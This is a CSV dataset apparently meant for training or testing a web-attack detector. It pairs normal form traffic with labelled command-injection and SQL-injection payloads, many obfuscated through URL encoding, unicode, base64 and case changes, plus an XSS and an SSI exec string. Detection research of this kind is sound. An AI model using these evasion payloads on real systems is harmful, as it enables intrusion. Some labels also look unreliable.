payload,label,source
%257C%257Cecho%252520EPBKKE%2524%2528%252859%25252B69%2529%2529%2524%2528echo%252520EPBKKE%2529EPBKKE%252522,CMD,obfuscation:double_url_encode
modo=insertar&precio=8348&B1=Confirmar,Normal,csic_gsi:cisc_normalTraffic_test.txt
%20echｏ%20HBFEEM$((46%2B2))$(ｅcho%20HBFEEM)HBFEEM',CMD,obfuscation:unicode_normalization
%252527%257C%2520%255B%25208%2520-ne%2520%2524%2528echo%2520FMCMJN%2520%257C%2520tr%2520-d%2520%2527%255Cn%2527%2520%257C%2520wc%2520-c%2529%2520%255D%2520%257C%257C%2520sleep%25201%2520%2526,CMD,obfuscation:url_encode
"--WebKitFormBoundary20756
Content-Disposition: form-data; name=""q""

${shell_exec(print(`echo%20RJFPQU\necho%20$((15%2B60))\necho%20RJFPQU\necho%20RJFPQU`)%3B%25252529%2525257DRJFPQU
--WebKitFormBoundary20756--",CMD,obfuscation:multipart_boundary_sim
"{""a"":{""b"":""Tiago""}}",SQLi,obfuscation:json_nested_escape
eval(atob('MDk2ODE=')),SQLi,obfuscation:base64_fragment
22F0DDC873E500A3B2AFDBEEE39D9E23,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
id=1&id=FDE4854AB2CDF118B26CBC0E89E0396C,SQLi,obfuscation:hpp_duplicate_param
"--WebKitFormBoundary57190
Content-Disposition: form-data; name=""q""

28980
--WebKitFormBoundary57190--",SQLi,obfuscation:multipart_boundary_sim
"modo=registro&login=dajerlin&password=3O172A1I0m6n19&nombre=Carmen&apellidos=Bordas+Rubies&email=carves@travelzone.hn&dni=59561138Q&direccion=Calle+Morera,+139,+8G&ciudad=Funes&cp=17143&provincia=Toledo&ntc=9899066630450137'OR'a='a&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%20echo%20EIFXCG$((20%2B68))$(echo%20EIFXCG)EIFXCG|,CMD,seclists_cmd
eval(atob('MkNCOURGNTA2QTdGN0U3REJCQTg1RjhEOEIzNEE3MkI=')),SQLi,obfuscation:base64_fragment
%3B%20str%3D%24%28echo%20MYWJNW%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%257C,CMD,seclists_cmd
B0FEC30121BB3549CF636294C9E86984,Normal,csic_gsi:cisc_normalTraffic_train.txt
643F8016\u00461\u0045\u0044\u0041B9\u004546134\u0042\u00455\u004148A\u0042B01,SQLi,obfuscation:unicode_escape
%2527%26%20sleep%200%20%26%26%20str%3D%24%28echo%20JDGURS%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%205%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%7C,CMD,seclists_cmd
85622882d71299B6ad29fc13f9F1cF83,SQLi,obfuscation:case_random
%0A%20stR%3d%24%28eCHo%20bguGcf%29%0A%20StR1%3D%24%7b%23StR%7D%0A%20IF%20%5b%208%20-ne%20%24%7bsTr1%7D%20%5D%0a%20ThEn%20slEep%200%0a%20eLSe%20SlEep%201%0a%20fI%20%252F%252f,CMD,obfuscation:case_random
"--WebKitFormBoundary92979
Content-Disposition: form-data; name=""q""

%7C%7Cecho$IFSKGBLOE$((27%2B72))$(echo$IFSKGBLOE)KGBLOE%26
--WebKitFormBoundary92979--",CMD,obfuscation:multipart_boundary_sim
eval(atob('Njc5RUY5RTY5NjhGQTJCNkQxQjEzN0EzMTUyMjc1QUE=')),SQLi,obfuscation:base64_fragment
eval(atob('JTI3JTBBJTIwc3RyJTNEJTI0JTI4ZWNobyUyMFdZWVlaTSUyOSUwQQ=='))%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2522,SQLi,obfuscation:base64_fragment
417A3C594BFBC57DD7DB2700143F8ECA,Normal,csic_gsi:cisc_normalTraffic_test.txt
eval(atob('Qzk1RUQ5QjE3MTNDQTY1QjVGRTdBQ0UzQ0I2RTBDN0E=')),SQLi,obfuscation:base64_fragment
"CONCAT(CHAR(49),CHAR(54),CHAR(51),CHAR(57),CHAR(55),CHAR(53),CHAR(50),CHAR(55),CHAR(49),CHAR(50),CHAR(56),CHAR(56),CHAR(48),CHAR(55),CHAR(50))",SQLi,obfuscation:char_function
%2527%3B%20sTr%3d%24%28ECHo%20qUKuCg%29%3B%20Str1%3d%24%7B%23str%7D%3b%20iF%20%5B%209%20-Ne%20%24%7BSTr1%7D%20%5d%3B%20THEN%20sLEeP%200%3B%20ElSE%20SlEEP%201%3B%20FI%20%22,CMD,obfuscation:case_random
1ABD7B698A74693B475C6DEB4B154C41/*--*/,SQLi,obfuscation:nested_comment
57641085A,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo%253Dinsertar%2526precio%253D3796%2526B1%253DPasar%252Bpor%252Bcaja%252F,SQLi,obfuscation:double_url_encode
%3Becho%20SETBTR$((9%2B9%006))$(echo%20SETBTR)SETBTR%27,CMD,obfuscation:null_byte
"{""a"":{""b"":""20F06C9F76382CEFE6450EACFA2DC902""}}",SQLi,obfuscation:json_nested_escape
%25253B%252520str%25253D%252524%252528echo%252520ZNGHTM%252529%25253B%252520str1%25253D%252524%25257B%252523str%25257D%25253B%252520if%252520%25255B%2525202%252520-ne%252520%252524%25257Bstr1%25257D%252520%25255D%25253B%252520then%252520sleep%2525200%25253B%252520else%252520sleep%2525201%25253B%252520fi%252520%25257C,CMD,obfuscation:double_url_encode
"""|echo$IFSIWKOFU$((23%2B55))$(echo$IFSIWKOFU)IWKOFU%%0022",CMD,obfuscation:null_byte
%252527%253B%2520str%253D%2524%2528echo%2520BVJEPJ%2529%253B%2520str1%253D%2524%257B%2523str%257D%253B%2520if%2520%255B%25202%2520-ne%2520%2524%257Bstr1%257D%2520%255D%253B%2520then%2520sleep%25200%253B%2520else%2520sleep%25201%253B%2520fi%2520%2523,CMD,obfuscation:url_encode
%2527%3B%20str%3D%24%28echo%20AUJGTN%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%257C,CMD,seclists_cmd
0je7265r06,Normal,csic_gsi:cisc_normalTraffic_test.txt
|echo$IFSBHTKLO$((25%2B57))$(echo$IFSBHTKLO)BHTKLO\,CMD,seclists_cmd
%26echo%24IFSTKZMMA%24%28%2870%252B55%29%29%24%28echo%24IFSTKZMMA%29TKZMMA%27,CMD,obfuscation:url_encode
24325,Normal,csic_gsi:cisc_normalTraffic_test.txt
Guadalupe' OR '1'='1,SQLi,obfuscation:logic_or_tautology
C21742F807C3E8BB13BADA7B9940494%002,SQLi,obfuscation:null_byte
%2526echo%252520ZCQYVF%2524%2528%252895%25252B44%2529%2529%2524%2528echo%252520ZCQYVF%2529ZCQYVF%252522,CMD,obfuscation:double_url_encode
phiｌｉpｓ,SQLi,obfuscation:unicode_normalization
%2522%3B%20str%3d%24%28eChO%20avkiFd%29%3B%20Str1%3D%24%7B%23STr%7d%3b%20if%20%5b%209%20-nE%20%24%7BstR1%7D%20%5D%3b%20theN%20sLeEp%200%3B%20Else%20sLEEP%201%3B%20Fi%20%23,CMD,obfuscation:case_random
"Pla+del+Pened�s,+El",Normal,csic_gsi:cisc_normalTraffic_train.txt
"--WebKitFormBoundary79303
Content-Disposition: form-data; name=""q""

09318
--WebKitFormBoundary79303--",SQLi,obfuscation:multipart_boundary_sim
%250aecho%2520EZVLSY%24%28%2812%252B10%29%29%24%28echo%2520EZVLSY%29EZVLSY%7C,CMD,obfuscation:url_encode
0099C0324860DEBA61B7E6E7CFFC4D1B,Normal,csic_gsi:cisc_normalTraffic_train.txt
Argim�n,Normal,csic_gsi:cisc_normalTraffic_train.txt
"{""a"":{""b"":""61FAFC9948A393586D18EE81528CF24F""}}",SQLi,obfuscation:json_nested_escape
eval(atob('JTBBJTIwc3RyJTNEJTI0JTI4ZWNobyUyMFFPRlhDWSUyOSUwQSUyMA=='))str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2526,CMD,obfuscation:base64_fragment
%27&&ｅcho$IFSQNMPMK$((16%2B94))$(ｅchｏ$IFSQNMPMK)QNMPMK,CMD,obfuscation:unicode_normalization
eval(atob('NjQ3QkVERjU4QTk3NDRCODY3NTcwNUNFOUYyREYyNDY=')),SQLi,obfuscation:base64_fragment
%7C%20%5B%207%20-ne%20%24%28echo%20PCTUKX%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%27,CMD,seclists_cmd
tranfagl,Normal,csic_gsi:cisc_normalTraffic_train.txt
3939CF537997CBE5435F86DE79130E71,Normal,csic_gsi:cisc_normalTraffic_test.txt
eval(atob('JiZlY2hvJTIwSEVUSE1EJCgoNDclMkI5OSkpJChlY2hvJTIwSEVUSA=='))MD)HETHMD\,CMD,obfuscation:base64_fragment
'echo$IFSWTMGEX$((31%2B97%00))$(echo$IFSWTMGEX)WTMGEX\,CMD,obfuscation:null_byte
galindo.rignault@rpdkorea.vi,Normal,csic_gsi:cisc_normalTraffic_test.txt
3\u00417363B288FC573B0C6E25930E89E660,SQLi,obfuscation:unicode_escape
ACFD62943FBB802365A57E9AA55EB2A0,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=insertar&precio=5323&B1=Pasar+por+caja,Normal,csic_gsi:cisc_normalTraffic_train.txt
"--WebKitFormBoundary93216
Content-Disposition: form-data; name=""q""

C/+Eugenio+Arbones,+84,+9-G
--WebKitFormBoundary93216--",SQLi,obfuscation:multipart_boundary_sim
B2/**/=/**/Vaciar+carritoany%0ASet-cookie%3A+Tamper%3D1041264011025374727,SQLi,obfuscation:inline_comment
Arbｏna+Yaz�ｎ,SQLi,obfuscation:unicode_normalization
01101234V/*--*/,SQLi,obfuscation:nested_comment
08FD65A377489065072420A59EEF8146,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"%0AECHO$IfscJkHEO$((35%2b18))$(eCho$IfsCjkHEo)cjKHEO""",CMD,obfuscation:case_random
"{""a"":{""b"":""5080659370035908""}}",SQLi,obfuscation:json_nested_escape
D4C6885E5D3004FDF696EDDFDF1081C6,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%20e\u0063h\u006f%20\u0043\u004b\u0046\u0041YE$((18%2B45))$(\u0065ch\u006f%20\u0043K\u0046\u0041Y\u0045)\u0043\u004bF\u0041YE%5C%5\u0043,CMD,obfuscation:unicode_escape
%25250A%252520str%25253D%252524%252528echo%252520GOUIRV%252529%25250A%252520str1%25253D%252524%25257B%252523str%25257D%25250A%252520if%252520%25255B%2525208%252520-ne%252520%252524%25257Bstr1%25257D%252520%25255D%25250A%252520then%252520sleep%2525200%25250A%252520else%252520sleep%2525201%25250A%252520fi%252520,CMD,obfuscation:double_url_encode
"--WebKitFormBoundary72840
Content-Disposition: form-data; name=""q""

5C653B51B3E8FC161122F07164263CD6
--WebKitFormBoundary72840--",SQLi,obfuscation:multipart_boundary_sim
modo=%00insertar&precio=@40&B1=Pasar+por+caja,SQLi,obfuscation:null_byte
"--WebKitFormBoundary58397
Content-Disposition: form-data; name=""q""

%26%26echo%20YFZXJX$((50%2B26))$(echo%20YFZXJX)YFZXJX//
--WebKitFormBoundary58397--",CMD,obfuscation:multipart_boundary_sim
"""%7Cecho$IFSRCWERA$((82%2B63))$(echo$IFSRCWERA)RCWER%00A%2F%2F",CMD,obfuscation:null_byte
"{""a"":{""b"":""paxton""}}",SQLi,obfuscation:json_nested_escape
%22%7C%7Cecho%20HUGKZQ$((0%2B67))$(echo%20HUGKZQ)HUGKZQ\,CMD,seclists_cmd
chantrawiboon@elreversotenebroso.th/*--*/,SQLi,obfuscation:nested_comment
id=1&id=wilmot@schnaps.com.ne,SQLi,obfuscation:hpp_duplicate_param
id=1&id=50A83EF40C932D250C54FE4BE8DF471E,SQLi,obfuscation:hpp_duplicate_param
52A18F6B7FA5260A3EEEC38535543E6E,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"{""a"":{""b"":""02F2F22A59727D511CFFD3B901FD7F67""}}",SQLi,obfuscation:json_nested_escape
\u004fl\u0069\u0061\u006e\u0061,SQLi,obfuscation:unicode_escape
"Tor%00rent+De+Can+Quintana,+179,+",SQLi,obfuscation:null_byte
%2522%257C%2520%255B%25202%2520-ne%2520%2524%2528echo%2520BLTNIK%2520%257C%2520tr%2520-d%2520%2527%255Cn%2527%2520%257C%2520wc%2520-c%2529%2520%255D%2520%257C%257C%2520sleep%25201%2520%252522,CMD,obfuscation:url_encode
%27%3B%20\u0073t\u0072%3D%24%28ech\u006f%20ZGY\u004f\u0042\u0051%29%3B%20\u0073tr1%3D%24%7B%23str%7D%3B%20\u0069\u0066%20%5B%209%20-n\u0065%20%24%7\u0042\u0073t\u00721%7D%20%5D%3\u0042%20\u0074h\u0065n%20\u0073leep%200%3\u0042%20el\u0073\u0065%20sl\u0065\u0065\u0070%201%3B%20f\u0069%20%252F%252F,CMD,obfuscation:unicode_escape
Leobaldo,Normal,csic_gsi:cisc_normalTraffic_train.txt
laurie6' OR '1'='1,SQLi,obfuscation:logic_or_tautology
%2522%2526echo%2524IFSEFVKLM%2524%2528%252889%25252B68%2529%2529%2524%2528echo%2524IFSEFVKLM%2529EFVKLM%252527,CMD,obfuscation:double_url_encode
169A4DF1BF8D4B354401EDD5BD720D48/*--*/,SQLi,obfuscation:nested_comment
taYLOR-yOung@ESPoSA.cOM.mu,SQLi,obfuscation:case_random
modo=insertar&precio=6183&B1=Confirmar,Normal,csic_gsi:cisc_normalTraffic_test.txt
Mo\u0072erue\u006ca+d\u0065+\u006cos+In\u0066\u0061\u006e\u007ao\u006ee\u0073,SQLi,obfuscation:unicode_escape
02660,Normal,csic_gsi:cisc_normalTraffic_train.txt
6ED37D4C58071A532EC0D25E7AB686AF,Normal,csic_gsi:cisc_normalTraffic_train.txt
eval(atob('RDJDMzA0M0ZGMjFFMzRGQzMwMjcyQjQ4NzczMzk3QTM=')),SQLi,obfuscation:base64_fragment
id=1&id=2542,SQLi,obfuscation:hpp_duplicate_param
"modo=<!--#EXEC+cmd=""ls+/""-->&login=laz&passw0x6f72d=d4S�8AB8&nombre=Caledonia&apellidos=Antonioli+Blanc&email=rao@ajuntamentdebarcelona20.vu&dni=99892750R&direccion=C/+Puerto+De+La+Luz+129,+&ciudad=Valverde+del+Majano&cp=34126&provincia=Baleares+(Illes)&ntc=4228631856170637&B1=Registrar",SQLi,obfuscation:hex_escape
"--WebKitFormBoundary43456
Content-Disposition: form-data; name=""q""

4355943432869477
--WebKitFormBoundary43456--",SQLi,obfuscation:multipart_boundary_sim
"CONCAT(CHAR(55),CHAR(55),CHAR(55),CHAR(50),CHAR(48),CHAR(54),CHAR(51),CHAR(53),CHAR(82))",SQLi,obfuscation:char_function
Marcia/*--*/,SQLi,obfuscation:nested_comment
"C/+Juan+De+Zoyas+50,+1?H/*--*/",SQLi,obfuscation:nested_comment
81CE6F79942FFD8FBB65073533B55723,Normal,csic_gsi:cisc_normalTraffic_train.txt
638D61D1B3809FC442CB91898C6438A8,Normal,csic_gsi:cisc_normalTraffic_train.txt
330e43E1414BAe81De4a3840482e129a,SQLi,obfuscation:case_random
0A7237187BEE175C18D8BDF133D55063,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
BC16B52A2BEEF287D322A76E44438F72,Normal,csic_gsi:cisc_normalTraffic_test.txt
MOdO=EntRAR&LogIn=MAIJala&PWD=IndIv!iDUalMenTe&rEmembER=oN/&b1=enTraR,SQLi,obfuscation:case_random
2A6964F833D86C1D1F503D4CB3651450,Normal,csic_gsi:cisc_normalTraffic_test.txt
7E10DCEE94CCA3D728D20F443D6FDDBF,Normal,csic_gsi:cisc_normalTraffic_test.txt
2681,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
eval(atob('bW9kbz1pbnNlcnRhciZwcmVjaW9BPTYwMjcmQjE9Q29uZmlybWFy')),SQLi,obfuscation:base64_fragment
D10E23F6BA9BC73772174D83065B5CB3,Normal,csic_gsi:cisc_normalTraffic_train.txt
02B3494539EF96A341B2293B5E6ED2F3,Normal,csic_gsi:cisc_normalTraffic_train.txt
"{""a"":{""b"":""Castellar+del+Vall�s""}}",SQLi,obfuscation:json_nested_escape
E7B7825E45B77E552FFA6ADCD083A6C5,Normal,csic_gsi:cisc_normalTraffic_test.txt
%0A%20str%3D%24%28echo%20GQPJFY%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%7C,CMD,seclists_cmd
%252527%250A%2520str%253D%2524%2528echo%2520WYAQUW%2529%250A%2520str1%253D%2524%257B%2523str%257D%250A%2520if%2520%255B%25203%2520-ne%2520%2524%257Bstr1%257D%2520%255D%250A%2520then%2520sleep%25200%250A%2520else%2520sleep%25201%250A%2520fi%2520%255C%255C,CMD,obfuscation:url_encode
10120,Normal,csic_gsi:cisc_normalTraffic_test.txt
\u0041CA61595917472F128\u0041617\u0044E4F\u004530109,SQLi,obfuscation:unicode_escape
D67BDA46A4562DB%00604716859798AC4C3,SQLi,obfuscation:null_byte
'prｉｎｔ(`ｅchｏ%20TUDOUK;ｅcho%20$((63%2B88));ｅchｏ%20TUDOUK;echｏ%20TUDOUK`)%3BTUDOUK,CMD,obfuscation:unicode_normalization
id=1&id=Castrocalb�n,SQLi,obfuscation:hpp_duplicate_param
|echo$IFSEBBOEZ$((37%2B91))$(echo$IFSEBBOEZ)EBBOEZ\,CMD,seclists_cmd
Yuｌｉsa,SQLi,obfuscation:unicode_normalization
%3B%20STr%3d%24%28ECho%20MjsZOl%29%3b%20STR1%3D%24%7b%23Str%7D%3B%20iF%20%5B%202%20-nE%20%24%7BStr1%7d%20%5d%3b%20tHen%20sleeP%200%3b%20eLse%20sLeEp%201%3B%20fI%20//,CMD,obfuscation:case_random
0x4f72iana,SQLi,obfuscation:hex_escape
"eval(atob('bW9kbz1pbnNlcnRhcjwhLS0jaW5jbHVkZStmaWxlPSJhcmNoaXZvXw=='))secreto""+-->&precio=6858&B1=Confirmar",SQLi,obfuscation:base64_fragment
%0aec\u0068o$I\u0046\u0053SAUSPH$((85%2B99))$(\u0065\u0063h\u006f$IFSSAUS\u0050H)SAU\u0053PH%2\u0046%2\u0046,CMD,obfuscation:unicode_escape
%26%20SlEEP%200%20%26%26%20STR%3D%24%28EChO%20kJFZDm%29%20%26%26%20StR1%3D%24%7b%23STR%7D%20%26%26%20%5b%202%20-eQ%20%24%7bStR1%7D%20%5D%20%26%26%20SLEEP%201%20%255C%255C,CMD,obfuscation:case_random
"C/+Codigo+Correspondencia+Oficial+Correos-telegrafos,+42+13-B",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"<iMg%0AsRc%0a=%0a""%0aJ%0Aa%0aV%0aa%0aS%0AC%0ar%0Ai%0AP%0AT%0A:%0AA%0Al%0aE%0ar%0aT%0A(%0a'%0AX%0As%0aS%0a'%0A)%0a""%0A>",SQLi,obfuscation:case_random
40330/*--*/,SQLi,obfuscation:nested_comment
Marchal+Bos' OR '1'='1,SQLi,obfuscation:logic_or_tautology
"--WebKitFormBoundary78385
Content-Disposition: form-data; name=""q""

B2=Vaciar+carrito'+AND+'1'='1
--WebKitFormBoundary78385--",SQLi,obfuscation:multipart_boundary_sim
0A9A5872E6F15CE8A4D91C39DD88D4DD,Normal,csic_gsi:cisc_normalTraffic_train.txt
modoA=insertar&precio=6992&B1=Confirmar' OR '1'='1,SQLi,obfuscation:logic_or_tautology
"--WebKitFormBoundary43312
Content-Disposition: form-data; name=""q""

FD575D7BE3BFB1B4D89A5DB1DD298707
--WebKitFormBoundary43312--",SQLi,obfuscation:multipart_boundary_sim
"--WebKitFormBoundary68483
Content-Disposition: form-data; name=""q""

%26%26echo%20ZHQBQS$((72%2B22))$(echo%20ZHQBQS)ZHQBQS//
--WebKitFormBoundary68483--",CMD,obfuscation:multipart_boundary_sim
vAFOSA,SQLi,obfuscation:case_random
id=1&id=9F2813F5E7F737A3186C252B4C5302EC,SQLi,obfuscation:hpp_duplicate_param
%7C%20%5B%204%20-ne%20%24%28echo%20TEUISW%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%255C%255C,CMD,seclists_cmd
Registrarbob%%0040%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org,SQLi,obfuscation:null_byte
\u0043F2237\u00463743B\u0041\u0043975\u0046\u0041A2\u0041\u0044F2352E37\u0041,SQLi,obfuscation:unicode_escape
CE1661125D0CD859768DE0EC1108D922,Normal,csic_gsi:cisc_normalTraffic_train.txt
girish,Normal,csic_gsi:cisc_normalTraffic_train.txt
%27%26%20\u0073leep%200%20%26%26%20s\u0074r%3D%24%28\u0065ch\u006f%20\u004eC\u0043VW\u0055%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%206%20-e\u0071%20%24%7B\u0073\u0074r1%7\u0044%20%5D%20%26%26%20sl\u0065ep%201%20%27,CMD,obfuscation:unicode_escape
A21B99C719C37F07C7CD16BA6CDA9225,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"id=1&id=B2=Vaciar+carrito','0','0','0','0');waitfor+delay+'0:0:15';--",SQLi,obfuscation:hpp_duplicate_param
&eChO$ifsakVcNq$((27%2b21))$(echO$IFsakvCnQ)akVCnq%22,CMD,obfuscation:case_random
%27%3Becho$IFSIFOFAH$((63%2B44))$%00(echo$IFSIFOFAH)IFOFAH,CMD,obfuscation:null_byte
"--WebKitFormBoundary38900
Content-Disposition: form-data; name=""q""

miguel_bridge@irmedia.nl
--WebKitFormBoundary38900--",SQLi,obfuscation:multipart_boundary_sim
blyth@elsentidodelavida.sl,Normal,csic_gsi:cisc_normalTraffic_test.txt
80B94CAE1102E94A461B5CC47A425FAF,Normal,csic_gsi:cisc_normalTraffic_train.txt
eval(atob('NDQ1ODk=')),SQLi,obfuscation:base64_fragment
%2527%3B%20STR%3d%24%28ECHo%20BvjEPj%29%3b%20sTr1%3d%24%7b%23str%7d%3b%20IF%20%5B%208%20-ne%20%24%7bStr1%7D%20%5D%3b%20thEn%20slEEP%200%3b%20else%20sLEep%201%3B%20fI%20%23,CMD,obfuscation:case_random
"--WebKitFormBoundary40490
Content-Disposition: form-data; name=""q""

zakarow','0','0');waitfor+delay+'0:0:15';--
--WebKitFormBoundary40490--",SQLi,obfuscation:multipart_boundary_sim
"Lugar+Capela+138,+",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"ModO=InSeRTAr','0','0','0');WAiTfOR+DeLAy+'0:0:15';--&prECio=2542&b1=CONfirmAR",SQLi,obfuscation:case_random
"modo=registro&login=maurijn&password=cHOclO&nombre=Ramsey&apellidos=Baldivieso&email=brutsman@etnics.ms&dni=53486450L&direccion=Cami+Antic+Animeta+43,+&ciudad=Marchagaz&cp=16192&provincia=Burgos&ntc=8651552740405089&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_train.txt
geldart5@corjet.hk,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%2527%26%26echo%2520DZOCJQ%24%28%2886%252B39%29%29%24%28echo%2520DZOCJQ%29DZOCJQ%2F%2F,CMD,obfuscation:url_encode
Leiro+Bald�,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
D87C772556E38DDC4B00997E5CDBE508/*--*/,SQLi,obfuscation:nested_comment
8DBE4A516E452C84573EDA230AADAE02,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%22%7C%20%5B%204%20-ne%20%24%28echo%20TPTKGE%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%26,CMD,seclists_cmd
%26%20sLEep%200%20%26%26%20stR%3d%24%28EcHO%20FXpfkU%29%20%26%26%20STr1%3D%24%7B%23str%7d%20%26%26%20%5b%208%20-eQ%20%24%7BsTR1%7d%20%5D%20%26%26%20SlEEP%201%20%2526,CMD,obfuscation:case_random
%7c%20%5b%207%20-Ne%20%24%28Echo%20qPUcUQ%20%7c%20TR%20-d%20%27%5cn%27%20%7C%20wC%20-C%29%20%5d%20%7C%7C%20SLeep%201%20%2527,CMD,obfuscation:case_random
"--WebKitFormBoundary16422
Content-Disposition: form-data; name=""q""

${system(print(`echo%20LWTWCT;echo%20$((98%2B35));echo%20LWTWCT;echo%20LWTWCT`)%3B%2523LWTWCT
--WebKitFormBoundary16422--",CMD,obfuscation:multipart_boundary_sim
343C4B3372FA8EF22FB1A4341FF1F2D9,Normal,csic_gsi:cisc_normalTraffic_train.txt
eval(atob('ZWNobyUyMFRKQVhVSiQoKDgwJTJCNzApKSQoZWNobyUyMFRKQVhVSg==')))TJAXUJ%2F%2F,SQLi,obfuscation:base64_fragment
eval(atob('JTI1MjIlMEElMjBzdHIlM0QlMjQlMjhlY2hvJTIwT0VDR0ZWJTI5JQ=='))0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20//,CMD,obfuscation:base64_fragment
4A8B2FFE69EB466FFAEA83FDFA3DE15C,Normal,csic_gsi:cisc_normalTraffic_test.txt
"GrAn+pasSEIg+DE+rOndA,+34,+",SQLi,obfuscation:case_random
7047B4C0D52F4A28579566E5D4D1EF25,Normal,csic_gsi:cisc_normalTraffic_test.txt
735c7b716F81395c824695Db3E8E1B2a,SQLi,obfuscation:case_random
%26echo%2520UPPHYJ%24%28%281%252B62%29%29%24%28echo%2520UPPHYJ%29UPPHYJ%255C%255C,CMD,obfuscation:url_encode
eval(atob('IiUyNiUyNmVjaG8kSUZTRU9DUUZOJCgoNTclMkIxMikpJChlY2hvJA=='))IFSEOCQFN)EOCQFN%2F%2F,CMD,obfuscation:base64_fragment
eval(atob('Mjc5MEREQzZFMDE4Q0NEMzhCQzVCNjEyNDYxREY4MUM=')),SQLi,obfuscation:base64_fragment
eval(atob('JTI1MjIlN0MlMjAlNUIlMjAxJTIwLW5lJTIwJTI0JTI4ZWNobyUyMA=='))BWWRBC%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%5C%5C,CMD,obfuscation:base64_fragment
CB3311B6C332977C6AF007D96E62A628,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
405AF7F3B8ADF2BA7A750AD79B1A90A2,Normal,csic_gsi:cisc_normalTraffic_train.txt
Rut,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%252527%250A%2520str%253D%2524%2528echo%2520RQFVAS%2529%250A%2520str1%253D%2524%257B%2523str%257D%250A%2520if%2520%255B%25207%2520-ne%2520%2524%257Bstr1%257D%2520%255D%250A%2520then%2520sleep%25200%250A%2520else%2520sleep%25201%250A%2520fi%2520%2F%2F,CMD,obfuscation:url_encode
FF62D27371B77DB84C10BF54D395C36B,Normal,csic_gsi:cisc_normalTraffic_train.txt
id=1&nombreA=Vino+Rioja&precio=85&cantidad=76&B1=A�adir+al+carrito,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
871F68072429FF825553A92C2810F9FD,Normal,csic_gsi:cisc_normalTraffic_train.txt
eval(atob('NDM1NTk0MzQzMjg2OTQ3Nw==')),SQLi,obfuscation:base64_fragment
